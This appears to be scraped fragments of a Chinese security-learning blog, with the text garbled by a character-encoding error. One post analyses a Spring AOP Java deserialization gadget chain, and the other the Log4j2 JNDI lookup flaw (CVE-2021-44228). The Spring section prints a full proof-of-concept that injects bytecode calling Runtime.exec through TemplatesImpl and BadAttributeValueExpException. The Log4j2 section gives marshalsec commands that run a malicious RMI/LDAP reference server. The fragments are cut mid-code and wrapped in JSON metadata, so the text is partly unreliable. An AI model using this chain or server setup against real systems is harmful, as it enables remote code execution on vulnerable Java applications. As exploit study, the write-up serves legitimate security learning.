org.springframework.aop.framework.ReflectiveMethodInvocation#proceed ä¸­ï¼Œå…¶è°ƒç”¨é“¾ä¸º org.springframework.aop.framework.ReflectiveMethodInvocation#proceed-\u003e org.springframework.aop.aspectj.AspectJAroundAdvice#invoke-\u003e org.springframework.aop.aspectj.AbstractAspectJAdvice#invokeAdviceMethod(org.aspectj.lang.JoinPoint, org.aspectj.weaver.tools.JoinPointMatch, java.lang.Object, java.lang.Throwable)-\u003e org.springframework.aop.aspectj.AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs çœ‹åˆ° org.springframework.aop.framework.ReflectiveMethodInvocation#proceed æ–¹æ³• @Nullable public Object proceed() throws Throwable { if (this.currentInterceptorIndex == this.interceptorsAndDynamicMethodMatchers.size() - 1) { return this.invokeJoinpoint(); } else { Object interceptorOrInterceptionAdvice = this.interceptorsAndDynamicMethodMatchers.get(++this.currentInterceptorIndex); if (interceptorOrInterceptionAdvice instanceof InterceptorAndDynamicMethodMatcher) { InterceptorAndDynamicMethodMatcher dm = (InterceptorAndDynamicMethodMatcher)interceptorOrInterceptionAdvice; Class\u003c?\u003e targetClass = this.targetClass != null ? this.targetClass : this.method.getDeclaringClass(); return dm.methodMatcher.matches(this.method, targetClass, this.arguments) ? dm.interceptor.invoke(this) : this.proceed(); } else { return ((MethodInterceptor)interceptorOrInterceptionAdvice).invoke(this); } } } è¿™é‡Œæˆ‘ä»¬è¦è®© interceptorOrInterceptionAdvice å¯¹è±¡ä¸º AspectJAroundAdvice ã€‚å¯ä»¥çœ‹åˆ° interceptorOrInterceptionAdvice å¯¹è±¡æ˜¯ä» this.interceptorsAndDynamicMethodMatchers è¿™ä¸ª List ä¸­æ‹¿å‡ºæ¥çš„ï¼Œå¯ä»¥åœ¨ ReflectiveMethodInvocation ä¸­çš„æ„é€ æ–¹æ³•ä¸­å¯¹å…¶èµ‹å€¼ ä½†æ˜¯è¿™é‡Œ ReflectiveMethodInvocation æœ¬èº«å¹¶æ²¡æœ‰å®ç° Serializable æ¥å£ï¼Œæƒ³è¦åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä½¿ç”¨ï¼Œåªèƒ½ä¾èµ–äºåŠ¨æ€åˆ›å»ºã€‚å¯ä»¥åœ¨ org.springframework.aop.framework.JdkDynamicAopProxy#invoke ä¸­å‘ç° è¿™é‡Œåˆšå¥½å®ä¾‹åŒ–äº† ReflectiveMethodInvocation ç±»ï¼Œå¹¶ä¸”åˆè°ƒç”¨äº†å…¶ proceed æ–¹æ³•ï¼Œè€Œä¸”æ°å¥½è¿™ä¸ªç±»åˆèƒ½ç”¨æ¥å®ç°åŠ¨æ€åˆ›å»ºï¼Œè€Œä¸”è¿˜å®ç°äº† Serializable æ¥å£ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯ source ç‚¹ åˆ†æå®Œæ¯•åï¼Œå›åˆ°åˆšæ‰çš„ org.springframework.aop.framework.ReflectiveMethodInvocation ä¸­ï¼Œè¿™é‡Œè¦èµ°åˆ° return ((MethodInterceptor)interceptorOrInterceptionAdvice).invoke(this); éœ€è¦é¿å…å®ç°ä¸¤ä¸ª if è¯­å¥ï¼Œè¿›å…¥ç¬¬ä¸€ä¸ª if è¯­å¥æ—¶åªè¦ List ä¸­æœ‰ä¸€ä¸ªå€¼å°±èƒ½è·³å‡ºã€‚ç¬¬äºŒä¸ª if è¯­å¥ï¼Œæˆ‘ä»¬è¿™é‡Œ interceptorOrInterceptionAdvice å¯¹è±¡ä¸º AspectJAroundAdviceï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯è·³å‡ºï¼Œæ•…è€Œæ— éœ€åšä½•æ“ä½œå³å¯è°ƒç”¨ ((MethodInterceptor)interceptorOrInterceptionAdvice).invoke(this) ","date":"2025-05-11","objectID":"/posts/816babd/:4:2","tags":["Java"],"title":"SpringAOPé“¾å­¦ä¹ ","uri":"/posts/816babd/"},{"categories":["Java"],"content":"sourceç‚¹JdkDynamicAopProxy\ræ¥åˆ° org.springframework.aop.framework åŒ…ä¸‹çš„ JdkDynamicAopProxy ï¼Œçœ‹åˆ°å…¶ invoke æ–¹æ³•ï¼Œæ³¨æ„åˆ°å…¶è°ƒç”¨ proceed æ–¹æ³•å¤„ MethodInvocation invocation = new ReflectiveMethodInvocation(proxy, target, method, args, targetClass, chain); retVal = invocation.proceed(); æˆ‘ä»¬è¦å®ç°interceptorOrInterceptionAdvice å¯¹è±¡ä¸º AspectJAroundAdviceï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦å…³æ³¨ chain çš„èµ‹å€¼å³å¯ List\u003cObject\u003e chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass); è·Ÿè¿›çœ‹çœ‹ getInterceptorsAndDynamicInterceptionAdvice æ–¹æ³•çš„å®ç° public List\u003cObject\u003e getInterceptorsAndDynamicInterceptionAdvice(Method method, @Nullable Class\u003c?\u003e targetClass) { MethodCacheKey cacheKey = new MethodCacheKey(method); List\u003cObject\u003e cached = (List)this.methodCache.get(cacheKey); if (cached == null) { cached = this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice(this, method, targetClass); this.methodCache.put(cacheKey, cached); } return cached; } å¯ä»¥çœ‹åˆ°æ‰€ä»¥è¿™é‡Œ cached æœ‰ä¸¤ç§è·å–æ–¹å¼ï¼Œä¸€ç§æ˜¯ä» this.methodCache ç›´æ¥è·å–å·²ç»ç¼“å­˜å¥½çš„ï¼Œæˆ–è€…æ˜¯ç”¨ this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice ç›´æ¥åˆ›å»ºä¸ªæ–°çš„ å…ˆçœ‹ç¬¬ä¸€ç§ private transient Map\u003cMethodCacheKey, List\u003cObject\u003e\u003e methodCache; ...... private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ois.defaultReadObject(); this.methodCache = new ConcurrentHashMap(32); } methodCache å±æ€§æœ‰transientä¿®é¥°ç¬¦ï¼Œä¸å‚ä¸åºåˆ—åŒ–è¿‡ç¨‹ï¼Œè€Œä¸” readObject é‡Œä¹Ÿæ˜¯æ²¡æœ‰åŠæ³•ä¿®æ”¹å…¶å€¼ é‚£çœ‹ç¬¬äºŒç§ï¼Œè·Ÿè¿›çœ‹çœ‹ public interface AdvisorChainFactory { List\u003cObject\u003e getInterceptorsAndDynamicInterceptionAdvice(Advised config, Method method, @Nullable Class\u003c?\u003e targetClass); } æ˜¯ä¸ªæ¥å£ç±»ï¼Œè·Ÿè¿›å…¶å®ç°ç±» DefaultAdvisorChainFactory ï¼Œçœ‹åˆ°å…¶ getInterceptorsAndDynamicInterceptionAdvice æ–¹æ³• public List\u003cObject\u003e getInterceptorsAndDynamicInterceptionAdvice(Advised config, Method method, @Nullable Class\u003c?\u003e targetClass) { AdvisorAdapterRegistry registry = GlobalAdvisorAdapterRegistry.getInstance(); Advisor[] advisors = config.getAdvisors(); List\u003cObject\u003e interceptorList = new ArrayList(advisors.length); Class\u003c?\u003e actualClass = targetClass != null ? targetClass : method.getDeclaringClass(); Boolean hasIntroductions = null; Advisor[] var9 = advisors; int var10 = advisors.length; for(int var11 = 0; var11 \u003c var10; ++var11) { Advisor advisor = var9[var11]; if (advisor instanceof PointcutAdvisor) { PointcutAdvisor pointcutAdvisor = (PointcutAdvisor)advisor; if (config.isPreFiltered() || pointcutAdvisor.getPointcut().getClassFilter().matches(actualClass)) { MethodMatcher mm = pointcutAdvisor.getPointcut().getMethodMatcher(); boolean match; if (mm instanceof IntroductionAwareMethodMatcher) { if (hasIntroductions == null) { hasIntroductions = hasMatchingIntroductions(advisors, actualClass); } match = ((IntroductionAwareMethodMatcher)mm).matches(method, actualClass, hasIntroductions); } else { match = mm.matches(method, actualClass); } if (match) { MethodInterceptor[] interceptors = registry.getInterceptors(advisor); if (mm.isRuntime()) { MethodInterceptor[] var17 = interceptors; int var18 = interceptors.length; for(int var19 = 0; var19 \u003c var18; ++var19) { MethodInterceptor interceptor = var17[var19]; interceptorList.add(new InterceptorAndDynamicMethodMatcher(interceptor, mm)); } } else { interceptorList.addAll(Arrays.asList(interceptors)); } } } } else if (advisor instanceof IntroductionAdvisor) { IntroductionAdvisor ia = (IntroductionAdvisor)advisor; if (config.isPreFiltered() || ia.getClassFilter().matches(actualClass)) { Interceptor[] interceptors = registry.getInterceptors(advisor); interceptorList.addAll(Arrays.asList(interceptors)); } } else { Interceptor[] interceptors = registry.getInterceptors(advisor); interceptorList.addAll(Arrays.asList(interceptors)); } } return interceptorList; } æœ€åè¿”å›çš„æ˜¯ interceptorList ï¼Œæœ‰å››å¤„ add æ–¹æ³•ï¼Œæ¯æ¬¡ add å‰éƒ½ä¼šç”¨ registry.getInterceptors(advisor) ç”Ÿæˆå…ƒç´ ï¼Œçœ‹ä¸‹ registry æ€ä¹ˆèµ‹å€¼ AdvisorAdapterRegistry registry = GlobalAdvisorAdapterRegistry.getInstance(); æ˜¯ä¸ªé™æ€æ–¹æ³•ï¼Œç›´æ¥è¿”å› DefaultAdvisorAdapterRegistry å®ä¾‹ï¼Œç»§ç»­è·Ÿè¿›åˆ°å…¶ getInterceptors æ–¹æ³• public MethodInterceptor[] getInterceptors(Advisor advisor) throws UnknownAdviceTypeException { Li","date":"2025-05-11","objectID":"/posts/816babd/:4:3","tags":["Java"],"title":"SpringAOPé“¾å­¦ä¹ ","uri":"/posts/816babd/"},{"categories":["Java"],"content":"poc\rè°ƒç”¨æ— å‚æ–¹æ³•çš„è¯ï¼Œè¿˜æ˜¯ç”¨ TemplatesImpl åŠ è½½å­—èŠ‚ç å¥½äº†ï¼Œç”¨ javassist æ¥æ„é€ å­—èŠ‚ç  ClassPool classpool = ClassPool.getDefault(); classpool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass ctClass = classpool.makeClass(\"poc\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; ctClass.setSuperclass(classpool.get(AbstractTranslet.class.getName())); ctClass.makeClassInitializer().insertBefore(cmd); byte[] bytecode = ctClass.toBytecode(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{bytecode}); setFieldValue(templates, \"_name\", \"6s6\"); å¥—ç¬¬ä¸€å±‚ JdkDynamicAopProxy åŠ¨æ€ä»£ç† public static Object getProxy1(Object obj, Class[] clazzs) throws Exception { //è®¾ç½®ä»£ç†å¯¹è±¡ AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(obj); Constructor constructor = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\").getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); return java.lang.reflect.Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler); } è®© advisorå®ç°MethodInterceptorå’Œadviceæ¥å£ï¼Œå¹¶å¥—ç¬¬äºŒå±‚JdkDynamicAopProxy åŠ¨æ€ä»£ç† public static Object getProxy2(Object obj, Class\u003c?\u003e clazz) throws Exception { AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(obj); DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor( (Advice) getProxy1(obj, new Class[]{MethodInterceptor.class, Advice.class}) ); advisedSupport.addAdvisor(advisor); Constructor constructor = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\").getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); return java.lang.reflect.Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler); } æ„é€ æ¶æ„çš„ AspectJAroundAdvice ï¼Œç¡®ä¿è§¦å‘å…¶ invoke æ–¹æ³•æ—¶èƒ½è°ƒç”¨ TemplatesImpl.newTransformer() Method Tem_newTransformer = TemplatesImpl.class.getMethod(\"newTransformer\"); SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(templates); AspectJAroundAdvice advice = new AspectJAroundAdvice(Tem_newTransformer, new AspectJExpressionPointcut(), factory); è®© advice å®ç° Advice æ¥å£ Object proxy1 = getProxy2(advice, Advice.class); ç»¼ä¸Šï¼Œå®Œæ•´poc package test; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.aopalliance.aop.Advice; import org.aopalliance.intercept.MethodInterceptor; import org.springframework.aop.aspectj.AspectJAroundAdvice; import org.springframework.aop.aspectj.AspectJExpressionPointcut; import org.springframework.aop.aspectj.SingletonAspectInstanceFactory; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.aop.support.DefaultIntroductionAdvisor; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; public class poc { public static void main(String args[]) throws Exception { ClassPool classpool = ClassPool.getDefault(); classpool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass ctClass = classpool.makeClass(\"poc\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; ctClass.setSuperclass(classpool.get(AbstractTranslet.class.getName())); ctClass.makeClassInitializer().insertBefore(cmd); byte[] bytecode = ctClass.toBytecode(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{bytecode}); setFieldValue(templates, \"_name\", \"6s6\"); Method Tem_newTransformer = TemplatesImpl.class.getMethod(\"newTransformer\"); SingletonAspectInstanceFactory factory = ne","date":"2025-05-11","objectID":"/posts/816babd/:5:0","tags":["Java"],"title":"SpringAOPé“¾å­¦ä¹ ","uri":"/posts/816babd/"},{"categories":["Java"],"content":"æ€»ç»“\ræ ¸å¿ƒå…¶å®å°±æ˜¯ä¸¤å±‚ä»£ç†ï¼Œæœ€å¤–å±‚ä»£ç†çš„ä½œç”¨æ˜¯ï¼Œåœ¨ååºåˆ—åŒ–è§¦å‘ BadAttributeValueExpException æ—¶ä¼šè°ƒç”¨ä»»æ„æ–¹æ³•çš„ toString æ–¹æ³•ï¼Œå¯ä»¥è§¦å‘å…¶ä»£ç†ç±» JdkDynamicAopProxy çš„ invoke æ–¹æ³• è€Œæœ€å†…å±‚åˆ™ä»…ä»…æ˜¯ä¸ºäº†è®©å†…å±‚çš„ advisor èƒ½æ»¡è¶³ä¸¤ä¸ªæ¥å£å®ç°ï¼Œè®©é“¾å­æ­£å¸¸ç»§ç»­ä¸‹å» è°ƒç”¨æ ˆ newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:483, Method (java.lang.reflect) invokeAdviceMethodWithGivenArgs:634, AbstractAspectJAdvice (org.springframework.aop.aspectj) invokeAdviceMethod:624, AbstractAspectJAdvice (org.springframework.aop.aspectj) invoke:72, AspectJAroundAdvice (org.springframework.aop.aspectj) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:483, Method (java.lang.reflect) invokeJoinpointUsingReflection:344, AopUtils (org.springframework.aop.support) invoke:208, JdkDynamicAopProxy (org.springframework.aop.framework) invoke:-1, $Proxy0 (com.sun.proxy) proceed:186, ReflectiveMethodInvocation (org.springframework.aop.framework) invoke:215, JdkDynamicAopProxy (org.springframework.aop.framework) toString:-1, $Proxy1 (com.sun.proxy) readObject:86, BadAttributeValueExpException (javax.management) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:483, Method (java.lang.reflect) invokeReadObject:1017, ObjectStreamClass (java.io) readSerialData:1896, ObjectInputStream (java.io) readOrdinaryObject:1801, ObjectInputStream (java.io) readObject0:1351, ObjectInputStream (java.io) readObject:371, ObjectInputStream (java.io) unser:87, poc (test) main:45, poc (test) åç»­ï¼šè²Œä¼¼æ— éœ€å¥—äºŒå±‚ï¼Œä¸€å±‚å°±è¡Œï¼Œè€Œä¸”è¿˜èƒ½æœ‰å‚è°ƒç”¨ ","date":"2025-05-11","objectID":"/posts/816babd/:6:0","tags":["Java"],"title":"SpringAOPé“¾å­¦ä¹ ","uri":"/posts/816babd/"},{"categories":["Java"],"content":"å‚è€ƒ\rhttps://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ https://gsbp0.github.io/post/springaop/ ","date":"2025-05-11","objectID":"/posts/816babd/:7:0","tags":["Java"],"title":"SpringAOPé“¾å­¦ä¹ ","uri":"/posts/816babd/"},{"categories":["Java"],"content":"Log4j2ï¼ˆCVE-2021-44228ï¼‰\r","date":"2025-04-13","objectID":"/posts/cde7a8a/:1:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"å‰è¨€\ræ²¡å­¦ java å°±çŸ¥é“è¿™ä¸ªæ¼æ´ï¼Œåº”è¯¥è¿˜æœ‰ä¸å°‘çš„è§£æå’Œç»•è¿‡ï¼Œè¿™é‡Œå°±ç®€å•å…ˆäº†è§£ä¸‹æœ€åŸºç¡€çš„ ","date":"2025-04-13","objectID":"/posts/cde7a8a/:2:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"ç®€ä»‹\rlog4j2æ˜¯apacheä¸‹çš„javaåº”ç”¨å¸¸è§çš„å¼€æºæ—¥å¿—åº“ï¼Œæ˜¯ä¸€ä¸ªå°±Javaçš„æ—¥å¿—è®°å½•å·¥å…·ã€‚åœ¨log4jæ¡†æ¶çš„åŸºç¡€ä¸Šè¿›è¡Œäº†æ”¹è¿›ï¼Œå¹¶å¼•å…¥äº†ä¸°å¯Œçš„ç‰¹æ€§ï¼Œå¯ä»¥æ§åˆ¶æ—¥å¿—ä¿¡æ¯è¾“é€çš„ç›®çš„åœ°ä¸ºæ§åˆ¶å°ã€æ–‡ä»¶ã€GUIç»„å»ºç­‰ï¼Œè¢«åº”ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œç”¨äºè®°å½•ç¨‹åºè¾“å…¥è¾“å‡ºæ—¥å¿—ä¿¡æ¯ã€‚ å…¶è¢«å¹¿æ³›åº”ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œå¼€å‘è€…å¯ä»¥åˆ©ç”¨è¯¥å·¥å…·å°†ç¨‹åºçš„è¾“å…¥è¾“å‡ºä¿¡æ¯è¿›è¡Œæ—¥å¿—è®°å½•ã€‚åœ¨javaä¸­æœ€å¸¸ç”¨çš„æ—¥å¿—æ¡†æ¶æ˜¯log4j2å’Œlogbackï¼Œå…¶ä¸­log4j2æ”¯æŒlookupåŠŸèƒ½ï¼ˆçœ‹åˆ°è¿™ä¸ªå°±çŸ¥é“è¦æ‰“ jndi ï¼‰ã€‚ä¾‹å¦‚å½“å¼€å‘è€…æƒ³åœ¨æ—¥å¿—ä¸­æ‰“å°ä»Šå¤©çš„æ—¥æœŸï¼Œåˆ™åªéœ€è¦è¾“å‡º${data:MM-dd-yyyy}ï¼Œæ­¤æ—¶log4jä¼šå°†${}ä¸­åŒ…è£¹çš„å†…å®¹å•ç‹¬å¤„ç†ï¼Œå°†å®ƒè¯†åˆ«ä¸ºæ—¥æœŸæŸ¥æ‰¾ï¼Œç„¶åå°†è¯¥è¡¨è¾¾å¼æ›¿æ¢ä¸ºä»Šå¤©çš„æ—¥æœŸå†…å®¹è¾“å‡ºä¸ºâ€œ08-22-2022â€ï¼Œè¿™æ ·åšå°±ä¸éœ€è¦å¼€å‘è€…è‡ªå·±å»ç¼–å†™æŸ¥æ‰¾æ—¥æœŸçš„ä»£ç ã€‚ç©¶å…¶æ ¹æœ¬ï¼Œè¿˜æ˜¯æœ€åè°ƒç”¨è§¦å‘äº† jndi ","date":"2025-04-13","objectID":"/posts/cde7a8a/:3:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"å½±å“ç‰ˆæœ¬\r2.0 \u003c= Apache log4j2 \u003c= 2.14.1 ","date":"2025-04-13","objectID":"/posts/cde7a8a/:4:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"ç¯å¢ƒæ­å»º\rpom.xml \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-core\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-api\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ejunit\u003c/groupId\u003e \u003cartifactId\u003ejunit\u003c/artifactId\u003e \u003cversion\u003e4.12\u003c/version\u003e \u003cscope\u003etest\u003c/scope\u003e \u003c/dependency\u003e å†å†™ä¸ªxmlæ–‡ä»¶æ¥å®ç°log4j2ï¼ˆyamlç­‰æ–‡ä»¶ä¹Ÿè¡Œï¼‰ï¼Œé»˜è®¤æ–‡ä»¶åä¸ºlog4j2.xmlï¼Œæ”¾åœ¨ src/main/resources ç›®å½•ä¸‹ \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!-- log4j2 é…ç½®æ–‡ä»¶ --\u003e \u003c!-- æ—¥å¿—çº§åˆ« trace\u003cdebug\u003cinfo\u003cwarn\u003cerror\u003cfatal --\u003e\u003cconfiguration status=\"info\"\u003e \u003c!-- è‡ªå®šä¹‰å±æ€§ --\u003e \u003cProperties\u003e \u003c!-- æ—¥å¿—æ ¼å¼(æ§åˆ¶å°) --\u003e \u003cProperty name=\"pattern1\"\u003e[%-5p] %d %c - %m%n\u003c/Property\u003e \u003c!-- æ—¥å¿—æ ¼å¼(æ–‡ä»¶) --\u003e \u003cProperty name=\"pattern2\"\u003e =========================================%n æ—¥å¿—çº§åˆ«ï¼š%p%n æ—¥å¿—æ—¶é—´ï¼š%d%n æ‰€å±ç±»åï¼š%c%n æ‰€å±çº¿ç¨‹ï¼š%t%n æ—¥å¿—ä¿¡æ¯ï¼š%m%n \u003c/Property\u003e \u003c!-- æ—¥å¿—æ–‡ä»¶è·¯å¾„ --\u003e \u003cProperty name=\"filePath\"\u003elogs/myLog.log\u003c/Property\u003e \u003c/Properties\u003e \u003cappenders\u003e \u003cConsole name=\"Console\" target=\"SYSTEM_OUT\"\u003e \u003cPatternLayout pattern=\"${pattern1}\"/\u003e \u003c/Console\u003e \u003cRollingFile name=\"RollingFile\" fileName=\"${filePath}\" filePattern=\"logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz\"\u003e \u003cPatternLayout pattern=\"${pattern2}\"/\u003e \u003cSizeBasedTriggeringPolicy size=\"5 MB\"/\u003e \u003c/RollingFile\u003e \u003c/appenders\u003e \u003cloggers\u003e \u003croot level=\"info\"\u003e \u003cappender-ref ref=\"Console\"/\u003e \u003cappender-ref ref=\"RollingFile\"/\u003e \u003c/root\u003e \u003c/loggers\u003e\u003c/configuration\u003e æœ€åå†™ä¸ªdemoæ¥è§¦å‘ package com.example; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import java.util.function.LongFunction; public class test { public static void main(String[] args) { Logger logger = LogManager.getLogger(LongFunction.class); String username = \"admin123\"; if (username != null ) { logger.info(\"User {} login in!\", username); } else { logger.error(\"User {} not exists\", username); } } } å¯ä»¥çœ‹åˆ°æ˜¯å°†ç™»å½•ä¿¡æ¯è®°å½•åˆ°äº† myLog.log ä¸­ ä¸Šé¢è¯´è¿‡äº† log4j2 ä¼šæŠŠ ${} åŒ…è£¹çš„è¿›è¡Œç‰¹æ®Šå¤„ç†ï¼Œæœ€åä¼šè§¦å‘ lookupï¼Œä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ lookup ç±»å‹ ${date}ï¼šè·å–å½“å‰æ—¥æœŸå’Œæ—¶é—´ï¼Œæ”¯æŒè‡ªå®šä¹‰æ ¼å¼ã€‚ ${pid}ï¼šè·å–å½“å‰è¿›ç¨‹çš„ IDã€‚ ${logLevel}ï¼šè·å–å½“å‰æ—¥å¿—è®°å½•çš„çº§åˆ«ã€‚ ${sys:propertyName}ï¼šè·å–ç³»ç»Ÿå±æ€§çš„å€¼ï¼Œä¾‹å¦‚ ${sys:user.home} è·å–ç”¨æˆ·ä¸»ç›®å½•ã€‚ ${env:variableName}ï¼šè·å–ç¯å¢ƒå˜é‡çš„å€¼ï¼Œä¾‹å¦‚ ${env:JAVA_HOME} è·å– Java å®‰è£…è·¯å¾„ã€‚ ${ctx:key}ï¼šè·å–æ—¥å¿—çº¿ç¨‹ä¸Šä¸‹æ–‡ï¼ˆThreadContextï¼‰ä¸­æŒ‡å®šé”®çš„å€¼ã€‚ ${class:fullyQualifiedName:methodName}ï¼šè·å–æŒ‡å®šç±»çš„é™æ€æ–¹æ³•çš„è¿”å›å€¼ã€‚ ${mdc:key}ï¼šè·å– MDC (Mapped Diagnostic Context) ä¸­æŒ‡å®šé”®çš„å€¼ã€‚ æ¯”å¦‚ ${date} ","date":"2025-04-13","objectID":"/posts/cde7a8a/:5:0","tags":["Java"],"title":"Log4j2æ¼æ´å­¦ä¹ ","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"æ¼æ´åˆ†æ\rå…ˆæ‰“ä¸‹ï¼Œç”¨marshalsecèµ·ä¸ªæ¶æ„çš„rmiæœåŠ¡ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://127.0.0.1:9999/#exp\" 9991 ldap ä¹Ÿæ˜¯è¿™æ · java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:9999/#exp\" 1099 æ‰“ä¸ªæ–­ç‚¹è°ƒè¯•ï¼Œæ¥åˆ° org.apache.logging.log4j.core.layout.PatternLayout ä¸‹çš„ toSerializable æ–¹æ³• è¿™ä¸ªç±»ä¸­æœ‰ä¸¤ä¸ª toSerializable æ–¹æ³•ï¼Œç”±äºæˆ‘ä»¬åœ¨ log4j2.xml ä¸­æ˜¯ä½¿ç”¨ \u003cPatternLayout pattern=\"${pattern1}\"/\u003e è¿™ç§é™æ€çš„é…ç½®æ–¹å¼ï¼Œæ‰€ä»¥æœ€åä¼šè°ƒç”¨åˆ°ç¬¬äºŒä¸ª toSerializable æ–¹æ³•ä¸­çš„ this.formatters.length æ¥è·å– ï¼Œè¿™ä¸ªç±»çš„æºç  public StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) { int len = this.formatters.length; for(int i = 0; i \u003c len; ++i) { this.formatters[i].format(event, buffer); } if (this.replace != null) { String str = buffer.toString(); str = this.replace.format(str); buffer.setLength(0); buffer.append(str); } return buffer; } è¿™ä¸ªç±»å°±æ˜¯å°†æ—¥å¿—å†…å®¹æŒ‰ log4j2.xml æ–‡ä»¶ä¸­è§„å®šå¥½çš„æ ¼å¼é‚£æ ·è¾“å‡ºï¼Œæˆ‘ä»¬è¿™é‡Œçš„æ ¼å¼ä¸º [%-5p] %d %c - %m%n æ‰€ä»¥ç¬¬ä¸ƒæ¬¡å¾ªç¯å°±ä¼šå¤„ç† %m ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„æ—¥å¿—æ¶ˆæ¯ï¼Œä¼šè°ƒç”¨åˆ° org.apache.logging.log4j.core.pattern.MessagePatternConverter#format è¿™é‡Œçš„ this.config å°±æ˜¯æˆ‘ä»¬å®ç°log4j2çš„æ–‡ä»¶ç±»å‹ï¼Œè¿™é‡Œæ˜¯xmlï¼Œthis.noLookups ä¸º false åˆ™ä»£è¡¨å¯ç”¨ ${} å˜é‡æ›¿æ¢ï¼Œè¿™é‡Œæˆ‘ä»¬æ²¡æœ‰åœ¨xmlä¸­æ˜¾å¼è§„å®šç¦ç”¨ï¼Œæ‰€ä»¥é»˜è®¤æ˜¯å¯ç”¨çš„ï¼Œè€Œä¸”æˆ‘ä»¬è¿™é‡Œæœ¬æ¥å°±éœ€è¦ç”¨åˆ°å˜é‡æ›¿æ¢ ç„¶åè¿›å…¥åˆ° if è¯­å¥é‡Œé¢ï¼Œå¦‚æœæ£€æµ‹åˆ° ${ å¼€å¤´ï¼Œåˆ™å–å‡ºä» offset åˆ°å½“å‰ workingBuilder æœ«å°¾çš„å†…å®¹ï¼Œæ•…è¿™é‡Œ value çš„å€¼å°±ä¸ºå½“æ—¶è¾“å…¥çš„å€¼ ç„¶åè°ƒç”¨ replace() ï¼Œåˆè°ƒç”¨ substitute()ï¼Œæœ€åä¼šè°ƒç”¨åˆ° org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariableï¼Œè¿™é‡Œçš„è°ƒç”¨æ ˆ resolveVariable:1106, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) å…¶æºç  protected String resolveVariable(final 